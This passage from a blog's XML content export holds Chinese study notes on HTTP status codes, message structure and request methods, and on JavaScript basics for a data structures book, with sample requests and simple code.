    <content type="text"><![CDATA[第四章 返回结果的 HTTP 状态码HTTP状态码负责表示客户端HTTP请求的返回结果、标记服务器端的处理是否正常、通知出现的错误等工作。让我们学习本章的学习，好好了解一下状态码的工作机制。 状态码告知从服务器端返回的请求结果状态码的职责是当客户端向服务器端发送请求时，描述返回的请求结果。借助状态码，用户可以知道服务器端是正常处理了请求，还是出现了错误。 状态码如 200 OK，以3位数字和原因短语组成。 数字中的第一位指定了响应类别，后两位无分类。响应类别有以下5种。 状态码的类别 类别 原因短语 1XX Information（信息性状态码） 接受的请求正在处理 2XX Success（成功状态码） 请求正常处理完毕 3XX Redirection（重定向状态码） 需要进行附加操作以完成请求 4XX Client Error（客户端错误状态码） 服务器无法处理请求 5XX Server Error（服务器错误状态码） 服务器处理请求出错 只要遵守状态码类别的定义，即使改变 RFC2616 中定义的状态码，或服务器端自行创建状态码都没问题。 仅记录在 RFC2616 上的 HTTP 状态码就达 40 种，若再加上WebDAV（Web-based Distributed Authoring and Versioning，基于万维网的分布式创作和版本控制）（RFC4918、5842） 和附加 HTTP 状态码（RFC6585）等扩展，数量就达 60 余种。别看种类繁多，实际上经常使用的大概只有 14 种。接下来，我们就介绍一下这些具有代表性的 14 个状态码。 2XX 成功2XX 的响应结果表示请求被正常处理了 200 OK表示可从客户端发来的请求在服务器端被正常处理了。 在响应报文内，随状态码一起返回的消息会因方法的不同而发送改变。比如，使用 GET 方法时，对应请求资源的实体会作为响应返回；而使用 HEAD 方法时，对应请求资源的实体首部不随着报文主体作为响应返回（即在响应中只返回首部，不会返回实体的主体部分）。 204 NO Content该状态码代表服务器接受的请求已成功处理，但在返回的响应报文中不含实体的主体部分。另外，也不允许返回任何实体的主体。比如，当从浏览器发出请求处理后，返回204响应，那么浏览器显示的页面不会发生更新。 一般在只需要从客户端往服务器发送消息，而对客户端不需要发送新消息内容的情况下使用。 206 Patial Content该状态码表示对客户端进行了范围请求，而服务器成功执行了这部分 GET 请求。响应报文中包含由 Content-Range 指定范围的实体内容、 3XX 重定向3XX响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。 301 Moved Permanently永久性重定向。该状态码表示请求的资源已被分配了新的URI，以后应使用资源现在所指URI。也就是说，如果已经把资源对应的URI保存为书签了，这时应该按Location首部字段提示的URI重新保存。 像下方给出的请求URI，当指定资源路径的最后忘记添加斜杠 ‘/’，就会产生301状态码 1http://example.com/sample 302 Found临时性重定向。该状态码表示请求的资源已被重新分配了新的URI，希望用户（本次）能使用新的URI访问。 和 301 Moved Permanetly状态码相似，但 302 状态码代表的资源不是永久移动，只是临时性质的。换句话说，已移动的资源对应的URI将来还有可能发生改变。比如，用户把URI保存成书签，但不会像301 状态码出现时那样去更新书签，而是仍旧保留返回 302 状态码的页面对应的 URI。 303 See other该状态码表示由于请求对应的资源存在另一个URI，应使用 GET 方法定向获取请求的资源。 303 状态码和 302 Found 状态码有着相同的功能，但303 状态码明确表示客户端应当采用 GET 方法获取资源，这点与 302 状态码有区别。 比如，当使用 POST 方法访问 CGI 程序，其执行后的处理结果是希望客户端能以 GET 方法重定向到另一个 URI 上去时，返回 303 状态码。虽然 302 Found 状态码也可以实现相同的功能，但这里使用 303状态码是最理想的。 当 301、302、303 响应状态码返回时，几乎所有的浏览器都会把POST 改成 GET，并删除请求报文内的主体，之后请求会自动再次发送。301、302 标准是禁止将 POST 方法改变成 GET 方法的，但实际使用时大家都会这么做。 304 Not Modified该状态码表示客户端发送附带条件的请求时，服务器端运行请求访问资源，但未满足条件的情况。304 状态码返回时，不包含任何响应的主体部分。304 虽然被划分在 3XX类别，但是和重定向没有关系。 附带条件的请求是指采用 GET 方法的请求报文中包含 If-Match，If-Modified-Since，If-None-Match，If-Range，If-Unmodified-Since 中任一首部。 307 Temporary Redirect临时重定向。该状态码与 302 Found 有着相同的含义。尽管 302 标准禁止 POST 改变成 GET ，但实际使用时大家并不遵循。 307 会遵照浏览器的标准，不会出现从 POST 变成 GET。但是，对于处理响应时的行为，各种浏览器有可能出现不同的情况。 4XX 客户端错误400 Bad Request该状态码表示请求报文中存在语法错误。当错误发生时，需修改请求的内容后再次请求。另外，浏览器会像 200 OK一样对待该状态码。 401 Unauthorized 该状态码表示发送的请求需要有通过HTTP认证（BASIC 认证、DIGEST 认证）的认证消息。另外若之前已进行过1次请求，则表示用户认证失败。 返回含有401的响应必须包含一个适用于被请求资源的WWW-Authenticate 首部用以质询（challenge）用户消息。当浏览器初次接收到 401 响应，会弹出认证用的对话窗口。 403 Forbidden该状态码表命对请求资源的访问被服务器拒绝了。服务器端没有必要给出拒绝的详细理由，但如果想作说明的话，可以在实体的主体部分对原因进行描述，这样用户就可以知道原因了。 未获得文件系统的访问授权，访问权限出现某些问题（从未授权的发送源IP地址试图访问）等列举的情况都可能是发生 403 的原因 404 Not Found该状态码表示服务器上无法找到请求的资源。除此之外，也可以在服务器端拒绝请求且不想说明理由时使用。 5XX服务器错误5XX的响应结果表明服务器本身发生的错误。 500 Internal Server Error该状态码表明服务器端在执行请求时发生了错误。也有可能是Web应用存在的bug或某些临时的故障。 503 Service Unavaliable该状态码表明服务器暂时处于超负载或正在停机维护，现在无法处理请求。如果事先得知解除以上状况需要的时间，最好写入 RetryAfter 首部字段再返回客户端。 状态码和状况的不一致不少返回的状态码响应都是错误的，但是用户可能察觉不到这点。比如 Web 应用程序内部发生错误，状态码依然返回 200 OK，这种情况也经常遇到。 参考链接：https://book.douban.com/subject/25863515/]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出HTTP，从开始到放弃（第三章）—— HTTP 报文内的 HTTP消息]]></title>
    <url>%2F2018-08-11-read-%E5%9B%BE%E8%A7%A3HTTP-Part3.html</url>
    <content type="text"><![CDATA[第三章 HTTP 报文内的 HTTP消息HTTP 通信过程包括从客户端发往服务器端的请求及从服务器端返回客户端的响应。本章就让我们来了解一下请求和响应是怎样运作的。 HTTP 报文用于 HTTP 协议交互的信息被称为 HTTP 报文。请求端（客户端）的HTTP 报文叫做请求报文，响应端（服务器端）的叫做响应报文。HTTP 报文本身是由多行（用 CR+LF 作换行符）数据构成的字符串文本。HTTP 报文大致可分为报文首部和报文主体两块。两者由最初出现的空行（CR+LF）来划分。通常，并不一定要有报文主体。 HTTP 报文的结构 HTTP 报文的结构 描述 报文首部 服务器端或客户端需处理的请求或响应的内容及属性 空行（CR+LF） CR(回车符，0x0d)和LF（换行符，0x0a） 报文主体 应被发送的数据 请求报文及响应报文的结构请求报文和响应报文的结构 请求报文和响应报文实例 请求报文和响应报文的首部内容由以下数据组成。现在出现的各种首部字段及状态码稍后会进行阐述。 首部内容组成 描述 请求行 包含用于请求的方法，请求 URI 和 HTTP 版本。 状态行 包含表明响应结果的状态码，原因短语和 HTTP 版本。 首部字段 包含表示请求和响应的各种条件和属性的各类首部。一般有 4 种首部，分别是：通用首部、请求首部、响应首部和实体首 其他 可能包含 HTTP 的 RFC 里未定义的首部（Cookie 等）。 编码提升传输速率HTTP 在传输数据时可以按照数据原貌直接传输，但也可以在传输过程中通过编码提升传输速率。通过在传输时编码，能有效地处理大量的访问请求。但是，编码的操作需要计算机来完成，因此会消耗更多的 CPU 等资源。 报文主体和实体主体的差异 报文（message） 是 HTTP 通信中的基本单位，由 8 位组字节流（octet sequence，其中 octet 为 8 个比特）组成，通过 HTTP 通信传输。 实体（entity） 作为请求或响应的有效载荷数据（补充项）被传输，其内容由实体首部和实体主体组成。 HTTP 报文的主体用于传输请求或响应的实体主体。通常，报文主体等于实体主体。只有当传输中进行编码操作时，实体主体的内容发生变化，才导致它和报文主体产生差异。报文和实体这两个术语在之后会经常出现，请事先理解两者的差异。 压缩传输的内容编码向待发送邮件内增加附件时，为了使邮件容量变小，我们会先用 ZIP压缩文件之后再添加附件发送。HTTP 协议中有一种被称为内容编码的功能也能进行类似的操作。内容编码指明应用在实体内容上的编码格式，并保持实体信息原样压缩。内容编码后的实体由客户端接收并负责解码。 常用的内容编码有以下几种。 gzip（GNU zip） compress（UNIX 系统的标准压缩） deflate（zlib） identity（不进行编码） 分割发送的分块传输编码在 HTTP 通信过程中，请求的编码实体资源尚未全部传输完成之前，浏览器无法显示请求页面。在传输大容量数据时，通过把数据分割成多块，能够让浏览器逐步显示页面。这种把实体主体分块的功能称为分块传输编码（Chunked TransferCoding）。 分块传输编码会将实体主体分成多个部分（块）。每一块都会用十六进制来标记块的大小，而实体主体的最后一块会使用“0(CR+LF)”来标记。使用分块传输编码的实体主体会由接收的客户端负责解码，恢复到编码前的实体主体。HTTP/1.1 中存在一种称为传输编码（Transfer Coding）的机制，它可以在通信时按某种编码方式传输，但只定义作用于分块传输编码中。 发送多种数据的多部分对象集合发送邮件时，我们可以在邮件里写入文字并添加多份附件。这是因为采用了 MIME（Multipurpose Internet Mail Extensions，多用途因特网邮件扩展）机制，它允许邮件处理文本、图片、视频等多个不同类型的数据。例如，图片等二进制数据以 ASCII 码字符串编码的方式指明，就是利用 MIME 来描述标记数据类型。而在 MIME 扩展中会使用一种称为多部分对象集合（Multipart）的方法，来容纳多份不同类型的数据。相应地，HTTP 协议中也采纳了多部分对象集合，发送的一份报文主体内可含有多类型实体。通常是在图片或文本文件等上传时使用。多部分对象集合包含的对象如下。 multipart/form-data 在 Web 表单文件上传时使用。 multipart/byteranges 状态码 206（Partial Content，部分内容）响应报文包含了多个范围的内容时使用。 multipart/form-data 123456789Content-Type: multipart/form-data; boundary=AaB03x--AaB03xContent-Disposition: form-data; name="field1"Joe Blow--AaB03xContent-Disposition: form-data; name="pics"; filename="file1.txt"Content-Type: text/plain...（file1.txt的数据）...--AaB03x-- multipart/byteranges 12345678910111213HTTP/1.1 206 Partial ContentDate: Fri, 13 Jul 2012 02:45:26 GMTLast-Modified: Fri, 31 Aug 2007 02:02:20 GMTContent-Type: multipart/byteranges; boundary=THIS_STRING_SEPARATES--THIS_STRING_SEPARATESContent-Type: application/pdfContent-Range: bytes 500-999/8000...（范围指定的数据）...--THIS_STRING_SEPARATESContent-Type: application/pdfContent-Range: bytes 7000-7999/8000...（范围指定的数据）...--THIS_STRING_SEPARATES-- 在 HTTP 报文中使用多部分对象集合时，需要在首部字段里加上Content-type。有关这个首部字段，我们稍后讲解。使用 boundary 字符串来划分多部分对象集合指明的各类实体。在boundary 字符串指定的各个实体的起始行之前插入“–”标记（例如：–AaB03x、–THIS_STRING_SEPARATES），而在多部分对象集合对应的字符串的最后插入“–”标记（例如：–AaB03x–、–THIS_STRING_SEPARATES–）作为结束。多部分对象集合的每个部分类型中，都可以含有首部字段。 获取部分内容的范围请求以前，用户不能使用现在这种高速的带宽访问互联网，当时，下载一个尺寸稍大的图片或文件就已经很吃力了。如果下载过程中遇到网络中断的情况，那就必须重头开始。 为了解决上述问题，需要一种可恢复的机制。所谓恢复是指能从之前下载中断处恢复下载。要实现该功能需要指定下载的实体范围。像这样，指定范围发送的请求叫做范围请求（Range Request）。对一份 10 000 字节大小的资源，如果使用范围请求，可以只请求5001~10 000 字节内的资源。 执行范围请求时，会用到首部字段 Range 来指定资源的 byte 范围。byte 范围的指定形式如下。 5001~10 000 字节 1Range: bytes=5001-10000 从 5001 字节之后全部的 1Range: bytes=5001- 从一开始到 3000 字节和 5000~7000 字节的多重范围 1Range: bytes=-3000, 5000-7000 针对范围请求，响应会返回状态码为 206 Partial Content 的响应报文。另外，对于多重范围的范围请求，响应会在首部字段 Content-Type 标明 multipart/byteranges 后返回响应报文。 如果服务器端无法响应范围请求，则会返回状态码 200 OK 和完整的实体内容。 内容协商返回最合适的内容同一个 Web 网站有可能存在着多份相同内容的页面。比如英语版和中文版的 Web 页面，它们内容上虽相同，但使用的语言却不同。当浏览器的默认语言为英语或中文，访问相同 URI 的 Web 页面时，则会显示对应的英语版或中文版的 Web 页面。这样的机制称为内容协商（Content Negotiation）。 内容协商机制是指客户端和服务器端就响应的资源内容进行交涉，然后提供给客户端最为适合的资源。内容协商会以响应资源的语言、字符集、编码方式等作为判断的基准。包含在请求报文中的某些首部字段（如下）就是判断的基准。这些首部字段的详细说明请参考下一章。 Accept Accept-Charset Accept-Encoding Accept-Language Content-Language 内容协商技术有以下3中类型 内容协商技术 描述 服务器驱动协商（Server-driven Negotiation） 由服务器端进行内容协商。以请求的首部字段为参考，在服务器端自动处理。但对于用户来说，以浏览器发送的消息作为判定的依据，并不一定能筛选出最优内容。 客户端驱动协商（Agent-driven Negotiation） 由客户端进行内容协商的方式。用户从浏览器显示的可选列表中手动选择。还可以利用JavsScript脚本在Web页面上自动进行上述选择。比如按 OS 的类型或浏览器类型，自行切换成 PC 版页面或手机版页面 透明协商（Transparent Negotiation） 是服务器驱动和客户端驱动的结合体，是由服务器端和客户端各自进行内容协商的一种方法。 参考链接：https://book.douban.com/subject/25863515/]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为什么我要放弃javaScript数据结构与算法（第一章）—— JavaScript简介]]></title>
    <url>%2F2018-08-10-JavaScipt%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95Part1.html</url>
    <content type="text"><![CDATA[数据结构与算法一直是我算比较薄弱的地方，希望通过阅读《javaScript数据结构与算法》可以有所改变，我相信接下来的记录不单单对于我自己有帮助，也可以帮助到一些这方面的小白，接下来让我们一起学习。 第一章 JavaScript简介众所周知，JavaScript是一门非常强大的编程语言，不仅可以用于前端开发，也适用于后端开发，其中Node.js就是背后的技术。 JavaScript数据结构与算法那么学习JavaScript数据结构与算法有什么作用呢？首要的作用是数据结构和算法可以高效地解决常见的问题，这影响着代码的质量。其次，在计算机科学里面，算法是基础的概念，是面试的时候的重头戏。 环境搭建浏览器是最简单的开发环境，下载个Firefox或者Chrome都可以。 下载好浏览器之后可以搭载一个Web服务器，方式有很多种,也都很简单，可以自行百度。下面介绍Node.js. 使用Node.js 搭建服务器首先到Node.js官网下载和安装Node.js。然后打开终端应用，输入一下命令安装 1npm i http-server -g 嫌安装过程慢的，可以安装一下淘宝镜像，就可以用 cnpm来安装,具体安装过程如下 1npm install -g cnpm --registry=https://registry.npm.taobao.org 安装完淘宝镜像后，就可以用 cnpm了 1cnpm i http-server -g 安装好 http-server后，cd进入到目标路径后输入 http-server就可以在本地运行服务器。 同样的还有 anywhere，也可以达到同样的目的。 1cnpm i anywhere -g 这样，整个环境就搭建好了。 JavaScript基础变量变量能保存的数据可以在需要时设置、更新和摄取。赋给变量的值都有对应的类型。 JavaScript的类型有数字、字符串、布尔值、函数和对象。还有 undefined 和 null，以及数组、日期和正则表达式。 注意：JavaScript不是强语言类型，跟后面我要学的TypeScript不一样，这意味着声明变量的时候不用指定变量的类型 调试输出变量值的时候有三种简单的方法 方法 描述 alert(“x”) 将输出到浏览器的警示窗口 console.log(“x”) 把文本输出到调试工具的Console标签 document.write(“x”) 直接输出到HTML页面里并被浏览器呈现 变量作用域作用域指在编写的算法函数时，我们能够访问的变量（在使用时，函数作用域也可以是一个函数）。有局部变量和全局变量两种。 操作符在JavaScript里有算数操作符、赋值操作符、比较操作符、逻辑操作符、位操作符、一元操作符和其他操作符。 算数操作符 算数操作符 描述 + 加法 - 减法 * 乘法 / 除法 % 取余 ++ 递增 - - 递减 赋值操作符 赋值操作符 描述 = 赋值 += （x += y） == ( x = x + y ) -= （x -= y） == ( x = x - y ) *= （x = y） == ( x = x \ y ) /= （x /= y） == ( x = x / y ) %= （x %= y） == ( x = x % y ) 比较操作符 比较操作符 描述 == 相等 === 全等 != 不等 &gt; 大于 >= 大于等于 &lt; 小于 &lt;= 小于等于 逻辑操作符 逻辑操作符 描述 &amp;&amp; 与 双竖线 或 ！ 非 位操作符 位操作符 描述 &amp; 与 单竖线 或 ~ 非 ^ 异或 &lt;&lt; 左移 >&gt; 右移 typeof操作符可以返回变量或者表达式的类型。 12345console.log(typeof num); // numberconsole.log(typeof "num"); // stringconsole.log(typeof true); // booleanconsole.log(typeof [1,2,3]); //objectconsole.log(typeof &#123;num:"2"&#125;); // object 真值和假值true和 false在 javascript 中的转换如下表 数值类型 转换成布尔值 undefined false null false 布尔值 true或者false 数字 +0/-0/NaN都是false其他是true 字符串 如果字符串是空（长度是0）为false,其他为true 对象 true 相等操作符 类型（x） 类型（y） 结果 null undefined true undefined null true 数字 字符串 x == toNumber(y) 字符串 数字 toNumber(x) == y 布尔值 任何类型 toNumber(x) == y 任何类型 布尔值 x == toNumber(y) 字符串或数字 对象 x == toPrimitive(y) 对象 字符串或数字 toPrimitive(x) == y 如果x和y是相同类型，javaScript会比较它们的值或者是对象值。其他没有在上述表格中的情况都会返回false。 toNumber和 toPrimitive方法都是内部的，并根据以下表格对其进行估值 toNumber方法对不同类型返回的结果如下表 值类型 结果 undefined NaN null +0 布尔值 true=&gt;1或者false=&gt;+0 数字 数字对应的值 字符串 将字符串解析成数字。如果字符串中包含字母，就返回NaN,如果是由数字字符组成的，就转换成数字 对象 Number(toPrimitive(value)) toPrimitive方法对不同类型返回的结果如下： 值类型 结果 对象 如果对象的valueOf方法的结果是原始值，返回原始值。如果对象的toString方法返回原始值，就返回这个值，其他情况都返回一个操作。 123"x" ? true : false // true"x"(NaN) == true(1) // false"x"(NaN) == false(+0) // false 那么 ===操作符呢？ 相比较起来就简单很多，如果比较的两个值类型不同，比较的结果就是 false,如果类型相同，就会根据下面的表格进行判断。 类型（x） 值 结果 数字 x和y数值相同（但不是NaN） true 字符串 x和y是相同的字符 true 布尔值 x和y同是false或者true true 对象 x和y引用同个对象 true 12345"x" === true // false"x" === "x" // truevar person1 = &#123; name: 'John' &#125;var person2 = &#123; name: 'John' &#125;person1 === person2 // false 不同的对象 控制结构条件语句支持 if...else和 switch。循环支持 while、do...while和 for。 条件语句实例：判断month 123456789101112131415161718192021222324252627281. if...elseif(month === 1)&#123; console.log('January');&#125;else if(month === 2)&#123; console.log('February');&#125;...else&#123; ...&#125;2. switchswitch(month)&#123; case 1: console.log('January'); break; case 2: console.log('February'); break; ... default: consolo.log(...)&#125;3. &amp;&amp; 与 || 运算符(month == 1 &amp;&amp; console.log('January')) || (month == 2 &amp;&amp; console.log('February')) || ...4. 三元运算符month == 1 ? console.log('January') : month == 2 ? console.log('February') : ... 循环处理数组元素的时候经常会用到循环。 实例：输出0到9 1234567891011121314151617181. forfor(var i = 0;i &lt; 10;i++)&#123; console.log(i);&#125;2.whilevar i = 0;while(i&lt;10)&#123; console.log(i); i++&#125;3.do ... whilevar i = 0;do&#123; console.log(i); i++:&#125; while(i&lt;10) 函数函数在JavsScript中是很重要的。分为用传参数、return或者是直接调用。 JavaScript面向对象编程JavaScript里的对象就是普通名值对的集合。创建一个普通对象有两种方式。 1234567891011// 第一种方式:var obj = new Object();// 第二种方式obj = &#123; name:&#123; first:"赖", last："xx" &#125;, address: "jj"&#125; 可以看出，声明JavaScript对象的时候，键值对中的键就是对象的属性，值就是对应属性的值。 在面向对象编程（OOP）中，对象是类的实例。一个类定义了对象的特征。我们会创建很多类来表示算法和数据结构。 1234567891011121314151617181920212223242526272829// 声明一个类来表示书function Book(title, pages, isbn)&#123; this.title = title; this.pages = pages; this.isbn = isbn;&#125;// 实例化这个类var book = new Book('title', 'pages', 'isbn' );//可以修改或者是访问对象的属性book.title // 书名book.title = "new title"; //修改书名// 类可以包含函数，可以声明和使用函数Book.prototype.printTitle = function()&#123; console.log(this.title);&#125;book.printTitle();// 也可以直接在类的定义里声明函数function Book(title, pages, isbn)&#123; this.title = title; this.pages = pages; this.isbn = isbn; this.printIsbn = function() &#123; console.log(this.isbn); &#125;&#125; book.printIsbn(); 注意：在原型的例子里， printTitle函数只会创建一次，在所有实例中共享。如果在类的定义里声明，则每个实例都会创建自己的函数副本。使用原型方法可以节约内存和降低实例化的开销。不过原型方法只能声明公共函数和属性，而类定义可以声明只在类内部访问的私有函数和属性。 调试工具Firefox 和 Chrome 都支持调试。这里有一个了解 谷歌开发者工具的好教程,可以自己了解一下。 ECMAScript概述ECMAScript是一种语言的规范，具体想知道的可以 点击这里 ECMAScript6的功能因为在别的地方有做了更详细的笔记，在这里就不累述，详情点击下面。 点我 补充：使用类进行面向对象编程1234567891011121314151617181920function Book(title, pages, isbn)&#123; this.title = title; this.pages = pages; this.isbn = isbn;&#125;Book.prototype.printTitle = function() &#123; console.log(this.title);&#125;ES6:class Book &#123; constructor(title, pages, isbn)&#123; this.title = title; this.pages = pages; this.isbn = isbn; &#125; printTitle()&#123; console.log(this.title); &#125;&#125; 继承 除了新的声明类的方式，类的继承也有简化的语法。 123456789clas ITBook extends Book &#123; constructor(title, pages, isbn, technology)&#123; super(title, pages, isbn); this.technology = technology; &#125; printTitle()&#123; console.log(this.title); &#125;&#125; 我们可以用 extends关键字扩展一个类并继承它的行为，在构造函数中，我们可以通过 super关键字引用父类的构造函数。 小结本章主要讲了如何搭建简单的开发环境，也稍微地把javaScript基础知识、和ECMAScript6过了一遍，为接下来的数据结构——数组做铺垫。 书籍链接： 学习JavaScript数据结构与算法]]></content>
      <categories>
        <category>javaScript相关</category>
      </categories>
      <tags>
        <tag>javaScript数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出HTTP，从开始到放弃（第二章）—— 简单的 HTTP 协议]]></title>
    <url>%2F2018-08-10-read-%E5%9B%BE%E8%A7%A3HTTP-Part2.html</url>
    <content type="text"><![CDATA[第二章 简单的 HTTP 协议HTTP协议用于客户端和服务器端之间的通信HTTP 协议和 TCP/IP 协议族内的其他众多的协议相同，用于客户端和服务器之间的通信。请求访问文本或图像等资源的一端称为客户端，而提供资源响应的一端称为服务器端。 应用HTTP协议时，必定是一端担任客户端角色，另一端担任服务器端角色。有时候，按实际情况，两台计算机作为客户端和服务器端的角色有可能会互换，但就仅从一条通信线路来说，服务器端和客户端的角色是确定的，而用HTTP协议能够明确区分哪端是客户端，哪端是服务器端。 通过请求和响应的交换达成通信请求必定由客户端发送，而服务器端回复响应 HTTP协议规定，请求从客户端发出，最后服务器端响应该请求并返回。换句话说，肯定是先从客户端开始建立通信的，服务器端在没有接受到请求之前不会发送响应。 下面则是从客户端发送某个HTTP服务器端的请求报文中的内容 12GET/index.htm HTTP/1.1HOST: hackr.jp 起始行开头的GET表示请求访问服务器的类型，称为方法（method）。随后的字符串/index.htm指明了请求访问的资源对象，也叫做请求URI(request-URI)。最后的HTTP/1.1，即HTTP的版本号，用来提示客户端使用的HTTP协议功能。 综合来看，这段请求内容的意思是：请求访问某台HTTP服务器上的 /index.htm页面资源。 请求报文是由请求方法、请求URL、协议版本、可选的请求首部字段和内容实体构成的。 图：请求报文的构成 请求首部字段及内容实体后面会作详细说明。接受到请求的服务器，会将请求内容的处理结果以响应的形式返回 123456HTTP/1.1 200 OKDate: Tue, 10 Jul 2012 06:50:15 GMTContent-Length: 362Content-Type: text/html... 在起始行开头的HTTP/1.1表示服务器对应的HTTP版本。 紧挨着的200 OK表示请求的处理结果的状态码（status code）和原因短语（reason-phrase）。下一行显示了创建响应的日期时间，是首部字段（header field）内的一个属性。接着以一空行分隔，之后的内容称为资源实体的主体（entity body）。 响应报文基本上由协议版本、状态码（表示请求成功或失败的数字代码）、用以解释状态码的原因短语、可选的响应首部字段以及实体主体构成。 图：响应报文的构成 HTTP是不保存状态的协议HTTP是一种不保存状态，即无状态（stateless）协议。HTTP协议自身不对请求和响应之间的通信状态进行保存。也就是说在HTTP这个级别，协议对于发送的请求或响应都不做持久化处理 使用HTTP协议，每当有新的请求发送时，就会有对应的新响应产生。协议本身并不保留之前的一切的请求或响应报文的信息。这是为了更快地处理大量事务，确保协议的可伸缩性，而特意把HTTP协议设计成如此简单的。可是，随着Web的不断发展，因无状态而导致业务处理变得棘手的情况增多了。比如，用户登录到一家购物网站，即使他跳转到该站的其他页面后，也需要能继续保持登录状态。针对这个实例，网站为了能够掌握是谁送出的请求，需要保存用户的状态。 HTTP/1.1 虽然是无状态协议，但为了实现期望的保持状态功能，于是引入了Cookie技术。有了Cookie再用HTTP协议通信，就可以管理状态了。 请求 URI 定位资源HTTP协议使用URI定位互联网上的资源。正是因为URI的特定功能，在互利网上任意位置的资源都能访问到。 当客户端请求在访问资源而发送请求时，URI需要将作为请求报文中请求URI包含在内。指定请求URI的方式有很多。 123456URI为完整的请求URIGET http://laibh.top/2018/08/09/2018-08-09-read-图解HTTP-Part2 在首部字段Host中写明网络域名或IP地址GET /2018/08/09/2018-08-09-read-图解HTTP-Part2 HTTP/1.1Host: laibh.top 除此之外，如果不是访问特定资源而是对服务器本身发起请求，可以用一个*来替代请求URI。下面这个例子就是查询HTTP服务端支持的HTTP的方法种类 1OPTIONS * HTTP/1.1 告知服务器意图的 HTTP 方法HTTP/1.1中可以使用的方法 GET: 获取资源GET方法用来请求访问已被URI识别的资源。指定的资源服务器端解析后返回响应内容。也就是说，如果请求的资源时文本，那就保持原样返回；如果是像CGI（Common Gateway Interface,通用网关接口）那样的程序，则返回经过执行后的输出结果 使用GET方法的请求响应的例子 状态 描述 请求 GET /index.html HTTP/1.1Host: www.hackr.jp 响应 返回 index.html 的页面资源 状态 描述 请求 GET /index.html HTTP/1.1Host: www.hackr.jpIf-Modified-Since: Thu,12 Jul 2012 07:30:00 GMT 响应 仅返回2017年7月12号7点30分以后更新过的index.html页面资源。如果未有内容更新，则以状态码304 Not Modified 作为响应返回 POST: 传输实体主体POST方法用来传输实体的主体 虽然用GET方法也可以传输实体的主体，但一般不用GET方法进行传输，而用POST方法。虽说POST的功能与GET很相似，但POST的主要目的并不是获取响应的主体内容。 使用POST方法的请求响应的例子 状态 描述 请求 POST /submit.cgi HTTP/1.1Host: www.hackr.jpContent-Length:1560（1560字节的数据） 响应 返回submit.cgi接受数据的处理结果 PUT: 传输文件PUT方法用来传输文件。就像FTP协议的文件上传一样，要求在请求报文的主体中包含文件内容，然后保存到请求URI指定的位置。 但是鉴于HTTP/1.1的PUT方法自身不带验证机制，任何人都可以上传文件，存在安全性问题，因此一般的Web网站不使用该方法。若配合Web应用程序的验证机制，或架构设计采用REST(REpresentational State Transfer,表征状态转移)标准的同类Web网络，就可能会开放使用PUT方法 使用PUT方法的请求响应的例子 状态 描述 请求 PUT/example.html HTTP/1.1Host: www.hackr.jpContent-Type: text/htmlContent-Lenght: 1560（1560字节的数据） 响应（请求执行成功了，但没有数据返回） 响应返回状态码204 Not Content(比如：该html已存在于服务器上) HEAD: 获得报文首部HEAD方法和GET方法一样，只是不返回报文主体部分。用于确认URI的有效性以及资源更新的日期时间等。 使用HEAD方法的请求响应的例子 状态 描述 请求 HEAD /index.html HTTP/1.1Host: www.hackr.jp 响应 返回 index.html 有关的响应首部 DELETE: 删除文件DELETE方法用来删除文件，是与PUT相反的方法。DELETE方法按请求URI删除指定的资源。但是，HTTP/1.1的DELETE方法本身和PUT方法一样不带验证机制，所以一般的Web网站也不使用DELETE方法。当配合Web应用程序的验证机制，或遵守REST标准时还是有可能会开放使用的。 使用DELETE方法的请求响应的例子 状态 描述 请求 DELETE /example.html HTTP/1.1Host: www.hackr.jp 响应 响应返回状态码204 Not Content(比如：该html已从服务器上删除) OPTIONS: 询问支持的方法OPTIONS方法用来查询针对请求URI指定的资源支持的方法 使用OPTIONS方法的请求响应的例子 状态 描述 请求 OPTIONS HTTP/1.1Host: www.hackr.jp 响应 HTTP/1.1 200 OKAllow: GET,POST,HEAD,OPTIONS（返回服务器支持的方法） Trace: 追踪路径TRACE方法是让Web服务器端将之前的请求通信环回客户端的方法。 发送请求时，在Max-Forwards首部字段中填入数值，每经过一个服务器端就将数字减1，当数值刚好减到0时，就停止继续传输，最后接受请求的服务器端则可以返回状态码200 OK 的响应 客户端通过TRACE方法可以查询发送出去的请求是怎么样被加工修改/篡改的。这是因为，请求想要连接到源目标服务器可能会通过代理中转。TRACE方法就是用来确认连接过程中发生的一系列操作。 但是，TRACE方法本来就不怎么常用，再加上它容易引发XST(Cross-Site Tracing,跨域追踪)攻击，通常就更不会用到了。 使用TRACE方法的请求响应的例子 状态 描述 请求 TRACE HTTP/1.1Host: www.hackr.jp Max-Forwards: 2 响应 HTTP/1.1 200 OKContent-Type: messgae/httpTRACE HTTP/1.1Host: www.hackr.jp Max-Forwards: 2 CONNECT: 要求用隧道协议连接代理CONNECT 方法要求与代理服务器通信建立隧道，实现隧道协议进行TCP通信。主要使用SSL（Secure Sockets Layer,安全套接层）和TLS(Transport Layer Security,传输层安全)协议把通信内容加密后经网络隧道传输 CONNECT方法的格式如下所示 1CONNECT 代理服务器名： 端口名 HTTP版本 使用CONNECT方法的请求响应的例子 状态 描述 请求 CONNECT proxy.hackr.jp:8080 HTTP/1.1Host: www.hackr.jp 响应 HTTP/1.1 200 OK (之后进入网络隧道) 使用方法下达命令想请求URI指定的资源发送请求报文时，采用称为方法的命令。 方法的作用用于，可以指定请求的资源按期望产生的某种行为。方法中有GET、POST、HEAD等 下表列出了HTTP/1.0 和 HTTP/1.1支持的方法。另外，方法名区别大小写，注意用大写字母 方法 说明 支持的HTTP协议版本 GET 获取资源 1.0、1.1 POST 传输实体主体 1.0、1.1 PUT 传输文件 1.0、1.1 HEAD 获得报文首部 1.0、1.1 DELETE 删除文件 1.0、1.1 OPTIONS 询问支持的方法 1.1 TRACE 追踪路径 1.1 CONNECT 要求用隧道协议连接代理 1.1 LINK 建立和资源之间的联系 1.0 UNLINK 断开连接关系 1.0 在这里列举的众多方法中，LINK和UNLINK已被HTTP/1.1废弃，不再支持 持久连接节省通信量HTTP协议的初始版本中，每进行一次HTTP通信就要断开一次TCP连接。 